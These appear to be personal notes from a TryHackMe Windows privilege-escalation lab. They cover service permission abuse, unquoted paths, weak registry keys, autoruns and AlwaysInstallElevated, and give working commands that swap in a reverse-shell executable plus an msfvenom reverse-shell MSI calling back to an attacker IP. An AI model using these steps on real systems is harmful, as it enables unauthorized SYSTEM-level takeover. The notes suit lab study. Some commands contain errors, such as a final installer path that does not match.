THMWindows Privilege Escalation

Privlege Esacalations:Windows

After the initial access to the system.

1. Service Exploits: Insecure Service Binary Permissions

Tool: accesschk.exe 
Command: accesschk.exe /accepteula -uwcqv user daclsvc

    Here daclsvc is the binary 

RW daclsvc
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL

The user has permissions to read and write to the binary. 

sc utility: 

C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

Changing the binaryexecution path: 
C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS

Retstart the service: 

2.Service Exploits :Unquoted Serivce Path: 

Find unquoted service paths using powerup.ps1 or winpeas.exe

Using sc utility: 

sc qc <service_Name> 

sc qc unquotedsvc

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

Check the user permissions in the path and  find the writable path: 

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
Users has write access to the path

Now copy the reverse shell exe file to the path. 

copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
Restart the service using net 
net start unquotedsvc

Service Exploits: Weak Registry Permissions 

Checking the registry using sc 

sc qc regsvc

sc qc regsvc 
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

Checking the permissions to the registry: 
C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS

verwrite the ImagePath registry key to point to the reverse.exe executable you created:

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc filepermsvc

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start filepermsvc

7. Registry - AutoRuns

Query the registry for AutoRun executables:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Using accesschk.exe, note that one of the AutoRun executables is wr itable by everyone:

C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.

rdesktop 10.10.252.219

8. Registry - AlwaysInstallElevated

Query the registry for AlwaysInstallElevated keys:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

msiexec /quiet /qn /i C:\xampp\htdocs\.msi

